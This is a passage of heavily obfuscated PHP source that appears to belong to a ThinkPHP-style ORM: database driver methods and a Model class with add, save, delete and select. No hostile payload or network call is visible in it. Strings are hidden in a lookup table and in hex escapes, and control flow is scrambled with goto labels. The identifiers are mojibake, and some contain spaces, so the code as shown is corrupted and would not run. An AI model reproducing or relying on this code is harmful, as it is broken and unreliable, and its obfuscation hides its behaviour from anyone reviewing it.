145\x5f\156\x61\x6d\x65\40\x3d\x20\x27{$dÇãì‚²­‡}\47"; break; case $a¿·Ê¡±æ[872]: $dô—ÉÛÑ¬® = $a¿·Ê¡±æ[873] . $dÇãì‚²­‡ . $a¿·Ê¡±æ[874]; break; case $a¿·Ê¡±æ[854]: case $a¿·Ê¡±æ[856]: $dô—ÉÛÑ¬® = $a¿·Ê¡±æ[875] . $a¿·Ê¡±æ[876] . $a¿·Ê¡±æ[877] . strtoupper($dÇãì‚²­‡) . $a¿·Ê¡±æ[878] . strtoupper($dÇãì‚²­‡) . $a¿·Ê¡±æ[879]; break; case $a¿·Ê¡±æ[880]: $dô—ÉÛÑ¬® = $a¿·Ê¡±æ[881] . $dÇãì‚²­‡ . $a¿·Ê¡±æ[882]; break; case $a¿·Ê¡±æ[855]: break; case $a¿·Ê¡±æ[883]: default: $dô—ÉÛÑ¬® = $a¿·Ê¡±æ[884] . ($this->dbType == $a¿·Ê¡±æ[883] ? "\x60{$dÇãì‚²­‡}\140" : $dÇãì‚²­‡); } } goto fï¼ó¤Æ£; FÔ¾†İÇ: return $f’é¾”Êº•; goto aÒƒŠˆ¨åí; aÒƒŠˆ¨åí: } public function getTables($D ‚İîƒ„ = '') { $bœà•ØÕô =& $_SERVER[¢ÌÛ]; if (think_config($bœà•ØÕô[886])) { $EŠ‰‹“  = str_replace($bœà•ØÕô[887], $D ‚İîƒ„, think_config($bœà•ØÕô[886])); } else { switch ($this->dbType) { case $bœà•ØÕô[854]: case $bœà•ØÕô[856]: $EŠ‰‹“  = $bœà•ØÕô[888]; break; case $bœà•ØÕô[853]: case $bœà•ØÕô[871]: $EŠ‰‹“  = $bœà•ØÕô[889]; break; case $bœà•ØÕô[880]: $EŠ‰‹“  = $bœà•ØÕô[890]; break; case $bœà•ØÕô[855]: think_exception(think_lang($bœà•ØÕô[891]) . $bœà•ØÕô[892]); break; case $bœà•ØÕô[872]: $EŠ‰‹“  = $bœà•ØÕô[42] . $bœà•ØÕô[43] . $bœà•ØÕô[44]; break; case $bœà•ØÕô[883]: default: if (!empty($D ‚İîƒ„)) { $EŠ‰‹“  = $bœà•ØÕô[836] . $D ‚İîƒ„ . $bœà•ØÕô[837]; } else { $EŠ‰‹“  = $bœà•ØÕô[838]; } } } $e°Å±ƒ— = $this->query($EŠ‰‹“ ); $A²‚ïÅò†Ğ = array(); foreach ($e°Å±ƒ— as $BÁÕŠÁÁî => $Dãï²ºÆİ¢) { $A²‚ïÅò†Ğ[$BÁÕŠÁÁî] = current($Dãï²ºÆİ¢); } return $A²‚ïÅò†Ğ; } protected function parseLimit($CĞğÇÏ–¥) { $C‹ÈÕÀË =& $_SERVER[¢ÌÛ]; $D¥©ñ¡…­Ú = $C‹ÈÕÀË[33]; if (!empty($CĞğÇÏ–¥)) { switch ($this->dbType) { case $C‹ÈÕÀË[880]: case $C‹ÈÕÀË[872]: $CĞğÇÏ–¥ = explode($C‹ÈÕÀË[47], $CĞğÇÏ–¥); if (count($CĞğÇÏ–¥) > 1) { $D¥©ñ¡…­Ú .= $C‹ÈÕÀË[48] . $CĞğÇÏ–¥[1] . $C‹ÈÕÀË[49] . $CĞğÇÏ–¥[0] . $C‹ÈÕÀË[50]; } else { $D¥©ñ¡…­Ú .= $C‹ÈÕÀË[48] . $CĞğÇÏ–¥[0] . $C‹ÈÕÀË[50]; } break; case $C‹ÈÕÀË[853]: case $C‹ÈÕÀË[871]: break; case $C‹ÈÕÀË[855]: break; case $C‹ÈÕÀË[854]: case $C‹ÈÕÀË[856]: break; case $C‹ÈÕÀË[883]: default: $D¥©ñ¡…­Ú .= $C‹ÈÕÀË[48] . $CĞğÇÏ–¥ . $C‹ÈÕÀË[50]; } } return $D¥©ñ¡…­Ú; } public function parseKey(&$Føƒ…÷Ùî, $dÃÄˆÀË·ƒ = true) { $cèö×ˆÍã =& $_SERVER[¢ÌÛ]; if ($dÃÄˆÀË·ƒ) { $Føƒ…÷Ùî = $this->parseKeyCheck($Føƒ…÷Ùî); } if ($this->dbType == $cèö×ˆÍã[883]) { if ($Føƒ…÷Ùî != $cèö×ˆÍã[182] && !preg_match($cèö×ˆÍã[848], $Føƒ…÷Ùî)) { $Føƒ…÷Ùî = $cèö×ˆÍã[377] . trim($Føƒ…÷Ùî, $cèö×ˆÍã[377]) . $cèö×ˆÍã[377]; } return $Føƒ…÷Ùî; } else { return parent::parseKey($Føƒ…÷Ùî); } } public function close() { $this->_linkID = null; } public function error() { $aøÎ×¡©È =& $_SERVER[¢ÌÛ]; if ($this->PDOStatement) { $cÓèôâ¥ø¶ = $this->PDOStatement->errorInfo(); $this->error = $cÓèôâ¥ø¶[1] . $aøÎ×¡©È[4] . $cÓèôâ¥ø¶[2]; } else { $this->error = $aøÎ×¡©È[33]; } if ($aøÎ×¡©È[33] != $this->queryStr) { $this->error .= LNG($aøÎ×¡©È[45]) . $this->queryStr; } think_trace($this->error, $aøÎ×¡©È[33], $aøÎ×¡©È[46]); return $this->error; } public function escapeString($a‹÷¡ŒÃ) { $DÃœ‡´ =& $_SERVER[¢ÌÛ]; switch ($this->dbType) { case $DÃœ‡´[880]: case $DÃœ‡´[853]: case $DÃœ‡´[871]: case $DÃœ‡´[883]: return addslashes($a‹÷¡ŒÃ); case $DÃœ‡´[855]: case $DÃœ‡´[872]: case $DÃœ‡´[854]: case $DÃœ‡´[856]: return str_ireplace($DÃœ‡´[55], $DÃœ‡´[56], $a‹÷¡ŒÃ); } } protected function parseValue($C³ÔŸ¬‡‡ì) { $CÉÖêß³¹ =& $_SERVER[¢ÌÛ]; if (is_string($C³ÔŸ¬‡‡ì)) { $C³ÔŸ¬‡‡ì = strpos($C³ÔŸ¬‡‡ì, $CÉÖêß³¹[4]) === 0 ? $this->escapeString($C³ÔŸ¬‡‡ì) : $CÉÖêß³¹[893] . $this->escapeString($C³ÔŸ¬‡‡ì) . $CÉÖêß³¹[893]; } elseif (isset($C³ÔŸ¬‡‡ì[0]) && is_string($C³ÔŸ¬‡‡ì[0]) && strtolower($C³ÔŸ¬‡‡ì[0]) == $CÉÖêß³¹[293]) { $C³ÔŸ¬‡‡ì = $this->escapeString($C³ÔŸ¬‡‡ì[1]); } elseif (is_array($C³ÔŸ¬‡‡ì)) { $C³ÔŸ¬‡‡ì = array_map(array($this, $CÉÖêß³¹[894]), $C³ÔŸ¬‡‡ì); } elseif (is_bool($C³ÔŸ¬‡‡ì)) { $C³ÔŸ¬‡‡ì = $C³ÔŸ¬‡‡ì ? $CÉÖêß³¹[86] : $CÉÖêß³¹[495]; } elseif (is_null($C³ÔŸ¬‡‡ì)) { $C³ÔŸ¬‡‡ì = $CÉÖêß³¹[102]; } return $C³ÔŸ¬‡‡ì; } public function getLastInsertId() { $f×Û—ÎËéå =& $_SERVER[¢ÌÛ]; switch ($this->dbType) { case $f×Û—ÎËéå[880]: case $f×Û—ÎËéå[872]: case $f×Û—ÎËéå[853]: case $f×Û—ÎËéå[871]: case $f×Û—ÎËéå[855]: case $f×Û—ÎËéå[883]: return $this->_linkID->lastInsertId(); case $f×Û—ÎËéå[854]: case $f×Û—ÎËéå[856]: $Dá¸‡×‰ò = $this->table; $fÌø¯½š¯® = $this->query("\x53\x45\x4c\105\x43\124\40{$Dá¸‡×‰ò}\56\143\165\x72\162\x76\141\x6c\40\143\x75\x72\162\x76\x61\x6c\x20\x46\122\x4f\115\40\144\165\141\x6c"); return $fÌø¯½š¯® ? $fÌø¯½š¯®[0][$f×Û—ÎËéå[895]] : 0; } } } $A‹ÓŒÀ‘¤ = $_SERVER[$_SERVER[¢ÌÛ][386]]; goto d—Ï‚Ùö™á; cÆÎë¯ñŒµ: define($_SERVER[¢ÌÛ][238], 0); define($_SERVER[¢ÌÛ][239], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\145", "\157\x72\x64\x65\162", "\141\154\151\141\163", "\x68\141\166\151\156\147", "\147\x72\157\x75\x70", "\154\x6f\x63\x6b", "\x64\x69\x73\x74\151\156\143\164", "\x61\165\x74\x6f", "\x66\151\x6c\x74\145\162", "\x76\141\154\151\x64\141\x74\145", "\162\145\x73\165\x6c\x74", "\142\x69\x6e\x64", "\x74\157\x6b\x65\156"); public function __construct($aÓÁÌ§¹÷ = '', $eÌ­¯»§ôí = '', $bªÑÅğÁ©à = '') { $E¬Õ˜³ø¦ =& $_SERVER[¢ÌÛ]; $this->_initialize(); if (!empty($aÓÁÌ§¹÷)) { if (strpos($aÓÁÌ§¹÷, $E¬Õ˜³ø¦[94])) { list($this->dbName, $this->name) = explode($E¬Õ˜³ø¦[94], $aÓÁÌ§¹÷); } else { $this->name = $aÓÁÌ§¹÷; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($eÌ­¯»§ôí)) { $this->tablePrefix = $E¬Õ˜³ø¦[33]; } elseif ($E¬Õ˜³ø¦[33] != $eÌ­¯»§ôí) { $this->tablePrefix = $eÌ­¯»§ôí; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($E¬Õ˜³ø¦[240]); } $this->db(0, empty($this->connection) ? $bªÑÅğÁ©à : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $A·êĞøªé =& $_SERVER[¢ÌÛ]; if (empty($this->fields)) { if (think_config($A·êĞøªé[241])) { $dÉƒ„¶ÉÊæ = $this->dbName ? $this->dbName : think_config($A·êĞøªé[242]); $f¦Ò‰ìÍòí = think_var_cache($A·êĞøªé[243] . strtolower(get_path_this($dÉƒ„¶ÉÊæ) . $A·êĞøªé[94] . $this->name)); if ($f¦Ò‰ìÍòí) { $dŒœÆŒ¿ = think_config($A·êĞøªé[244]); if (empty($dŒœÆŒ¿) || $f¦Ò‰ìÍòí[$A·êĞøªé[245]] == $dŒœÆŒ¿) { $this->fields = $f¦Ò‰ìÍòí; return; } } } $this->flush(); } } public function flush() { goto BÎ³´·‡Ñ; Båì„ØŠ¬ : if (think_config($aÉáÕ¨‹Ø[241])) { $Bø›†®âáà = $this->dbName ? $this->dbName : think_config($aÉáÕ¨‹Ø[242]); think_var_cache($aÉáÕ¨‹Ø[243] . strtolower(get_path_this($Bø›†®âáà) . $aÉáÕ¨‹Ø[94] . $this->name), $this->fields); } goto E”Æ‘°¢Ñ‹; fùõùÀ’£: foreach ($B´âÂˆßš¡ as $eÈäö‘íâè => $c¾¤à®ØŠÁ) { $añáõ¢òŠ[$eÈäö‘íâè] = $c¾¤à®ØŠÁ[$aÉáÕ¨‹Ø[29]]; if ($c¾¤à®ØŠÁ[$aÉáÕ¨‹Ø[36]]) { $this->fields[$aÉáÕ¨‹Ø[247]] = $eÈäö‘íâè; if ($c¾¤à®ØŠÁ[$aÉáÕ¨‹Ø[39]]) { $this->fields[$aÉáÕ¨‹Ø[246]] = !0; } } } $this->fields[$aÉáÕ¨‹Ø[248]] = $añáõ¢òŠ; if (think_config($aÉáÕ¨‹Ø[244])) { $this->fields[$aÉáÕ¨‹Ø[245]] = think_config($aÉáÕ¨‹Ø[244]); } goto Båì„ØŠ¬ ; F×¥ÃÌñÌ‹: if (!$B´âÂˆßš¡) { return !1; } $this->fields = array_keys($B´âÂˆßš¡); $this->fields[$aÉáÕ¨‹Ø[246]] = !1; goto fùõùÀ’£; BÎ³´·‡Ñ: $aÉáÕ¨‹Ø =& $_SERVER[¢ÌÛ]; $this->db->setModel($this->name); $B´âÂˆßš¡ = $this->db->getFields($this->getTableName()); goto F×¥ÃÌñÌ‹; E”Æ‘°¢Ñ‹: } public function switchModel($E¥àÌØ³–, $eÄëÀ½ª‚ğ = array()) { $D¿ùæ¶ˆ¹ =& $_SERVER[¢ÌÛ]; $eéÚö„’¼Ó = ucwords(strtolower($E¥àÌØ³–)) . $D¿ùæ¶ˆ¹[249]; if (!class_exists($eéÚö„’¼Ó)) { think_exception($eéÚö„’¼Ó . think_lang($D¿ùæ¶ˆ¹[250])); } $this->_extModel = new $eéÚö„’¼Ó($this->name); if (!empty($eÄëÀ½ª‚ğ)) { foreach ($eÄëÀ½ª‚ğ as $C‰˜ëÎ­à) { $this->_extModel->setProperty($C‰˜ëÎ­à, $this->{$C‰˜ëÎ­à}); } } return $this->_extModel; } public function __set($f®Õ‘¾ããÈ, $b½îÈ±Ù©É) { $this->data[$f®Õ‘¾ããÈ] = $b½îÈ±Ù©É; } public function __get($dˆòè­›â) { return isset($this->data[$dˆòè­›â]) ? $this->data[$dˆòè­›â] : null; } public function __isset($eóš¢·¼Œ¯) { return isset($this->data[$eóš¢·¼Œ¯]); } public function __unset($Cà‡‚¡ò‡ª) { unset($this->data[$Cà‡‚¡ò‡ª]); } public function __call($b‘œù¥Ğ‚, $BÕ£Š„ŒÄ­) { $bÛÍî¢ÕËŠ =& $_SERVER[¢ÌÛ]; if (in_array(strtolower($b‘œù¥Ğ‚), $this->methods, !0)) { $this->options[strtolower($b‘œù¥Ğ‚)] = $BÕ£Š„ŒÄ­[0]; return $this; } elseif (in_array(strtolower($b‘œù¥Ğ‚), array($bÛÍî¢ÕËŠ[251], $bÛÍî¢ÕËŠ[252], $bÛÍî¢ÕËŠ[253], $bÛÍî¢ÕËŠ[254], $bÛÍî¢ÕËŠ[255]), !0)) { $AÇ¤è»áù„ = isset($BÕ£Š„ŒÄ­[0]) ? $BÕ£Š„ŒÄ­[0] : $bÛÍî¢ÕËŠ[182]; $AÇ¤è»áù„ = $this->db->parseKey($AÇ¤è»áù„); return $this->getField(strtoupper($b‘œù¥Ğ‚) . $bÛÍî¢ÕËŠ[256] . $AÇ¤è»áù„ . $bÛÍî¢ÕËŠ[257] . $b‘œù¥Ğ‚, $bÛÍî¢ÕËŠ[251]); } elseif (strtolower(substr($b‘œù¥Ğ‚, 0, 5)) == $bÛÍî¢ÕËŠ[258]) { $AÇ¤è»áù„ = think_parse_name(substr($b‘œù¥Ğ‚, 5)); $E²–Ù­‡´[$AÇ¤è»áù„] = $BÕ£Š„ŒÄ­[0]; return $this->where($E²–Ù­‡´)->find(); } elseif (strtolower(substr($b‘œù¥Ğ‚, 0, 10)) == $bÛÍî¢ÕËŠ[259]) { $Aò½Áèîµ© = think_parse_name(substr($b‘œù¥Ğ‚, 10)); $E²–Ù­‡´[$Aò½Áèîµ©] = $BÕ£Š„ŒÄ­[0]; return $this->where($E²–Ù­‡´)->getField($BÕ£Š„ŒÄ­[1]); } elseif (isset($this->_scope[$b‘œù¥Ğ‚])) { return $this->scope($b‘œù¥Ğ‚, $BÕ£Š„ŒÄ­[0]); } elseif (method_exists($this, $b‘œù¥Ğ‚)) { array_unshift($BÕ£Š„ŒÄ­, $b‘œù¥Ğ‚); return call_user_func_array(array($this, $bÛÍî¢ÕËŠ[260]), $BÕ£Š„ŒÄ­); } else { return call_user_func_array(array(parent, $b‘œù¥Ğ‚), $BÕ£Š„ŒÄ­); } } protected function call() { goto eëğ¬è…Å°; eëğ¬è…Å°: $aêŠ‰ó¬ˆ› =& $_SERVER[¢ÌÛ]; $aíƒĞ‡‡¡„ = func_get_args(); $eŠ¡¬¾éçä = array_shift($aíƒĞ‡‡¡„); goto AãÊùˆ—½Ë; AãÊùˆ—½Ë: $dÅ¨¾¹«¯ = $eŠ¡¬¾éçä; if (is_array($eŠ¡¬¾éçä)) { $dÅ¨¾¹«¯ = $eŠ¡¬¾éçä[1]; $eŠ¡¬¾éçä = $eŠ¡¬¾éçä[0]; } $fÎ… ã£« = count($aíƒĞ‡‡¡„) - 1; goto cªöİ‡™Ì; cªöİ‡™Ì: if (isset($aíƒĞ‡‡¡„[$fÎ… ã£«]) && $aíƒĞ‡‡¡„[$fÎ… ã£«] === $eŠ¡¬¾éçä) { think_exception(__CLASS__ . $aêŠ‰ó¬ˆ›[4] . $eŠ¡¬¾éçä . think_lang($aêŠ‰ó¬ˆ›[261])); return; } $aíƒĞ‡‡¡„[] = $eŠ¡¬¾éçä; if (method_exists($this, $aêŠ‰ó¬ˆ›[262])) { $BÅ¤ªƒ„¼ = call_user_func_array(array($this, $aêŠ‰ó¬ˆ›[263]), array($dÅ¨¾¹«¯, $aíƒĞ‡‡¡„)); if (!is_null($BÅ¤ªƒ„¼) && $BÅ¤ªƒ„¼ !== !1) { return $BÅ¤ªƒ„¼; } } goto C“èÌ­²ˆÑ; C“èÌ­²ˆÑ: $dÅ¹›¢éç´ = call_user_func_array(array($this, $eŠ¡¬¾éçä), $aíƒĞ‡‡¡„); if (method_exists($this, $aêŠ‰ó¬ˆ›[264])) { $BÅ¤ªƒ„¼ = call_user_func_array(array($this, $aêŠ‰ó¬ˆ›[265]), array($dÅ¨¾¹«¯, $aíƒĞ‡‡¡„, $dÅ¹›¢éç´)); if ($BÅ¤ªƒ„¼) { return $BÅ¤ªƒ„¼; } } return $dÅ¹›¢éç´; goto Fáµ¾ßÒ; Fáµ¾ßÒ: } protected function _initialize() { } protected function _facade($cÉéµÓäñÌ) { $Cä‰œ…³Ò¿ =& $_SERVER[¢ÌÛ]; if (!empty($this->fields)) { foreach ($cÉéµÓäñÌ as $B§åÆÙã“˜ => $dçÛĞáŸ´×) { if (is_array($this->fields) && !in_array($B§åÆÙã“˜, $this->fields, !0)) { unset($cÉéµÓäñÌ[$B§åÆÙã“˜]); } elseif (is_scalar($dçÛĞáŸ´×)) { $this->_parseType($cÉéµÓäñÌ, $B§åÆÙã“˜); } } } if (!empty($this->options[$Cä‰œ…³Ò¿[266]])) { $cÉéµÓäñÌ = array_map($this->options[$Cä‰œ…³Ò¿[266]], $cÉéµÓäñÌ); unset($this->options[$Cä‰œ…³Ò¿[266]]); } $this->_beforeWrite($cÉéµÓäñÌ); return $cÉéµÓäñÌ; } protected function _beforeWrite(&$e÷Ã·Î†“á) { } public function add($b›¡—ØİÆ© = '', $dŠÃêˆµ«‚ = array(), $e½ŞßÄÛË = false) { goto cäÊ˜Àå”; A†›š”Ê™Õ: if (!1 === $this->_beforeInsert($b›¡—ØİÆ©, $dŠÃêˆµ«‚)) { return !1; } $f¸ğóœğ = $this->db->insert($b›¡—ØİÆ©, $dŠÃêˆµ«‚, $e½ŞßÄÛË); if (!1 !== $f¸ğóœğ) { $eàˆßÈ®â˜ = $this->getLastInsID(); if ($eàˆßÈ®â˜) { $b›¡—ØİÆ©[$this->getPk()] = $eàˆßÈ®â˜; $this->_after_insert($b›¡—ØİÆ©, $dŠÃêˆµ«‚); return $eàˆßÈ®â˜; } $this->_after_insert($b›¡—ØİÆ©, $dŠÃêˆµ«‚); } goto cÔÎ­æ¶ì; cäÊ˜Àå”: if (empty($b›¡—ØİÆ©)) { if (!empty($this->data)) { $b›¡—ØİÆ© = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¢ÌÛ][267]); return !1; } } $dŠÃêˆµ«‚ = $this->_parseOptions($dŠÃêˆµ«‚); $b›¡—ØİÆ© = $this->_facade($b›¡—ØİÆ©); goto A†›š”Ê™Õ; cÔÎ­æ¶ì: return $f¸ğóœğ; goto C÷¤§©ò; C÷¤§©ò: } protected function _beforeInsert(&$BÂÜ•¢§ ¸, $e†±¾ÇËº) { } protected function _after_insert($a¨ïÛ•ÒñĞ, $B—ã¯ÒÊÖ) { } public function addAll($DÚ‹¶ÙÎÆ’, $a›„µ¿¹®º = array(), $B¶‚»ï«‹Ğ = false) { goto C”¤—¡å¼; C”¤—¡å¼: $AÑØâ…Ò†£ =& $_SERVER[¢ÌÛ]; if (empty($DÚ‹¶ÙÎÆ’)) { $this->error = think_lang($AÑØâ…Ò†£[267]); return !1; } $a›„µ¿¹®º = $this->_parseOptions($a›„µ¿¹®º); goto e‚Şˆ‰èß³; fàÚ÷ÕÄİ‚: return $EŒÁæ··ó; goto Dˆ¬–Èˆ„; e‚Şˆ‰èß³: foreach ($DÚ‹¶ÙÎÆ’ as $a‘‡õ³ãÜ¯ => $A³¤³¤Îè†) { $DÚ‹¶ÙÎÆ’[$a‘‡õ³ãÜ¯] = $this->_facade($A³¤³¤Îè†); } if (method_exists($this->db, $AÑØâ…Ò†£[268])) { $EŒÁæ··ó = $this->db->insertAll($DÚ‹¶ÙÎÆ’, $a›„µ¿¹®º, $B¶‚»ï«‹Ğ); } else { $this->startTrans(); foreach ($DÚ‹¶ÙÎÆ’ as $a‘‡õ³ãÜ¯ => $A³¤³¤Îè†) { $EŒÁæ··ó = $this->db->insert($A³¤³¤Îè†, $a›„µ¿¹®º, $B¶‚»ï«‹Ğ); } $this->commit(); } if (!1 !== $EŒÁæ··ó) { $aƒ£Ôë¿æ¤ = $this->getLastInsID(); if ($aƒ£Ôë¿æ¤) { return $aƒ£Ôë¿æ¤; } } goto fàÚ÷ÕÄİ‚; Dˆ¬–Èˆ„: } public function selectAdd($f×ìÉŸí¿ = '', $b¼Ö¼Á”ô = '', $B°à—”š = array()) { $e£çª¥¬› =& $_SERVER[¢ÌÛ]; $B°à—”š = $this->_parseOptions($B°à—”š); if (!1 === ($aåæŠÑÏ¢ = $this->db->selectInsert($f×ìÉŸí¿ ? $f×ìÉŸí¿ : $B°à—”š[$e£çª¥¬›[269]], $b¼Ö¼Á”ô ? $b¼Ö¼Á”ô : $this->getTableName(), $B°à—”š))) { $this->error = think_lang($e£çª¥¬›[270]); return !1; } else { return $aåæŠÑÏ¢; } } public function save($DÉÌïö‹  = '', $fìÉ Ş = array()) { goto cí´¸™¶¥†; f‡…¹¥š: if (is_array($fìÉ Ş[$fùœÑÇ±Œ´[271]]) && isset($fìÉ Ş[$fùœÑÇ±Œ´[271]][$c’õ¨¯ºò])) { $EÍß™”õ•ã = $fìÉ Ş[$fùœÑÇ±Œ´[271]][$c’õ¨¯ºò]; } if (!1 === $this->_beforeUpdate($DÉÌïö‹ , $fìÉ Ş)) { return !1; } $bÊğÄªÅ¡‹ = $this->db->update($DÉÌïö‹ , $fìÉ Ş); goto B—¨‹ö³ŒÙ; f’¬¸öŸ¦­: $fìÉ Ş = $this->_parseOptions($fìÉ Ş); $c’õ¨¯ºò = $this->getPk(); if (!isset($fìÉ Ş[$fùœÑÇ±Œ´[271]])) { if (isset($DÉÌïö‹ [$c’õ¨¯ºò])) { $fïÁóæÕ˜[$c’õ¨¯ºò] = $DÉÌïö‹ [$c’õ¨¯ºò]; $fìÉ Ş[$fùœÑÇ±Œ´[271]] = $fïÁóæÕ˜; unset($DÉÌïö‹ [$c’õ¨¯ºò]); } else { $this->error = think_lang($fùœÑÇ±Œ´[270]); return !1; } } goto f‡…¹¥š; cí´¸™¶¥†: $fùœÑÇ±Œ´ =& $_SERVER[¢ÌÛ]; if (empty($DÉÌïö‹ )) { if (!empty($this->data)) { $DÉÌïö‹  = $this->data; $this->data = array(); } else { $this->error = think_lang($fùœÑÇ±Œ´[267]); return !1; } } $DÉÌïö‹  = $this->_facade($DÉÌïö‹ ); goto f’¬¸öŸ¦­; B—¨‹ö³ŒÙ: if (!1 !== $bÊğÄªÅ¡‹) { if (isset($EÍß™”õ•ã)) { $DÉÌïö‹ [$c’õ¨¯ºò] = $EÍß™”õ•ã; } $this->_afterUpdate($DÉÌïö‹ , $fìÉ Ş); } return $bÊğÄªÅ¡‹; goto e±ÏÛ÷É¢; e±ÏÛ÷É¢: } protected function _beforeUpdate(&$c±Œ³‰“…, $E´íä¯”°) { } protected function _afterUpdate($EÃÛä­¯‚ç, $cµ±  ŞæÍ) { } public function delete($FÏØùƒÖÛ = array()) { goto CƒÚÊáôÌÏ; eğê‹“é¦à: $D˜ªŸÁİ‰ = $this->db->delete($FÏØùƒÖÛ); if (!1 !== $D˜ªŸÁİ‰) { $BáÛ¸ßŒï» = array(); if (isset($AÇ¶“øòïª)) { $BáÛ¸ßŒï»[$bÙÙ¯ĞÀÍÆ] = $AÇ¶“øòïª; } $this->_after_delete($BáÛ¸ßŒï», $FÏØùƒÖÛ); } return $D˜ªŸÁİ‰; goto e¡°Ñ£Çİ©; aø‡Ô–Éªæ: if (is_numeric($FÏØùƒÖÛ) || is_string($FÏØùƒÖÛ)) { if (strpos($FÏØùƒÖÛ, $c»Ò©¶¶ĞÒ[47])) { $eíÄ¶Ÿˆï[$bÙÙ¯ĞÀÍÆ] = array($c»Ò©¶¶ĞÒ[272], $FÏØùƒÖÛ); } else { $eíÄ¶Ÿˆï[$bÙÙ¯ĞÀÍÆ] = $FÏØùƒÖÛ; } $this->options[$c»Ò©¶¶ĞÒ[271]] = $eíÄ¶Ÿˆï; } $FÏØùƒÖÛ = $this->_parseOptions(); if (is_array($FÏØùƒÖÛ[$c»Ò©¶¶ĞÒ[271]]) && isset($FÏØùƒÖÛ[$c»Ò©¶¶ĞÒ[271]][$bÙÙ¯ĞÀÍÆ])) { $AÇ¶“øòïª = $FÏØùƒÖÛ[$c»Ò©¶¶ĞÒ[271]][$bÙÙ¯ĞÀÍÆ]; } goto eğê‹“é¦à; CƒÚÊáôÌÏ: $c»Ò©¶¶ĞÒ =& $_SERVER[¢ÌÛ]; if (empty($FÏØùƒÖÛ) && empty($this->options[$c»Ò©¶¶ĞÒ[271]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $bÙÙ¯ĞÀÍÆ = $this->getPk(); goto aø‡Ô–Éªæ; e¡°Ñ£Çİ©: } protected function _after_delete($DİĞØ´£à, $eéáÈÏİÜ¤) { } public function select($BîŠÌ³ñˆÈ = array()) { goto A­½Ìö·; bæ„ÎÅÍÕ: $this->_afterSelect($e§Íò¤äÊÔ, $BîŠÌ³ñˆÈ); return $e§Íò¤äÊÔ; goto Eƒ¶çÒİğ²; A­½Ìö·: $B–…Óç¼½ç =& $_SERVER[¢ÌÛ]; if (is_string($BîŠÌ³ñˆÈ) || is_numeric($BîŠÌ³ñˆÈ)) { $AÒğÑÊ•› = $this->getPk(); if (strpos($BîŠÌ³ñˆÈ, $B–…Óç¼½ç[47])) { $cò¹ÑË¥ìÙ[$AÒğÑÊ•›] = array($B–…Óç¼½ç[272], $BîŠÌ³ñˆÈ); } else { $cò¹ÑË¥ìÙ[$AÒğÑÊ•›] = $BîŠÌ³ñˆÈ; } $this->options[$B–…Óç¼½ç[271]] = $cò¹ÑË¥ìÙ; } elseif (!1 === $BîŠÌ³ñˆÈ) { $BîŠÌ³ñˆÈ = $this->_parseOptions(); return $B–…Óç¼½ç[273] . $this->db->buildSelectSql($BîŠÌ³ñˆÈ) . $B–…Óç¼½ç[274]; } $BîŠÌ³ñˆÈ = $this->_parseOptions(); goto aÕ“İç¦Ï”; aÕ“İç¦Ï”: $e§Íò¤äÊÔ = $this->db->select($BîŠÌ³ñˆÈ); if (!1 === $e§Íò¤äÊÔ) { return !1; } if (empty($e§Íò¤äÊÔ)) { return null; } goto bæ„ÎÅÍÕ; Eƒ¶çÒİğ²: } protected function _afterSelect(&$a«„åŸ§ø, $A¢©¨ƒ˜·¼) { } public function buildSql($eãõíÍ®ëï = array()) { $d›ÀŞ‰ÁÍá =& $_SERVER[¢ÌÛ]; $eãõíÍ®ëï = $this->_parseOptions($eãõíÍ®ëï); return $d›ÀŞ‰ÁÍá[273] . $this->db->buildSelectSql($eãõíÍ®ëï) . $d›ÀŞ‰ÁÍá[274]; } public function optionsValue($aÎ÷È‚ì‰ = null) { if (is_null($aÎ÷È‚ì‰)) { return $this->options; } elseif (is_array($aÎ÷È‚ì‰)) { $this->options = array_merge($this->options, $aÎ÷È‚ì‰); } } protected function _parseOptions($dàË°ÓŒ = array()) { goto D¸ÂÆ©»ë»; eàËÓÎî: if (!isset($dàË°ÓŒ[$Dõºô¿‡Ê‚[275]])) { $dàË°ÓŒ[$Dõºô¿‡Ê‚[275]] = $this->getTableName(); $bÆÄÔÃ‰ = $this->fields; } else { $bÆÄÔÃ‰ = $this->getDbFields(); } if (!empty($dàË°ÓŒ[$Dõºô¿‡Ê‚[276]])) { $dàË°ÓŒ[$Dõºô¿‡Ê‚[275]] .= $Dõºô¿‡Ê‚[50] . $dàË°ÓŒ[$Dõºô¿‡Ê‚[276]]; } $dàË°ÓŒ[$Dõºô¿‡Ê‚[277]] = $this->name; goto aÎïÇ«öÑï; aÎïÇ«öÑï: if (isset($dàË°ÓŒ[$Dõºô¿‡Ê‚[271]]) && is_array($dàË°ÓŒ[$Dõºô¿‡Ê‚[271]]) && !empty($bÆÄÔÃ‰) && !isset($dàË°ÓŒ[$Dõºô¿‡Ê‚[278]]) && !isset($dàË°ÓŒ[$Dõºô¿‡Ê‚[275]])) { foreach ($dàË°ÓŒ[$Dõºô¿‡Ê‚[271]] as $d¦§•µ‰óÄ => $F˜¥®ƒ©¡ù) { $d¦§•µ‰óÄ = trim($d¦§•µ‰óÄ); if (in_array($d¦§•µ‰óÄ, $bÆÄÔÃ‰, !0)) { if (is_scalar($F˜¥®ƒ©¡ù)) { $this->_parseType($dàË°ÓŒ[$Dõºô¿‡Ê‚[271]], $d¦§•µ‰óÄ); } } elseif (!is_numeric($d¦§•µ‰óÄ) && $Dõºô¿‡Ê‚[70] != substr($d¦§•µ‰óÄ, 0, 1) && !1 === strpos($d¦§•µ‰óÄ, $Dõºô¿‡Ê‚[94]) && !1 === strpos($d¦§•µ‰óÄ, $Dõºô¿‡Ê‚[256]) && !1 === strpos($d¦§•µ‰óÄ, $Dõºô¿‡Ê‚[279]) && !1 === strpos($d¦§•µ‰óÄ, $Dõºô¿‡Ê‚[280])) { 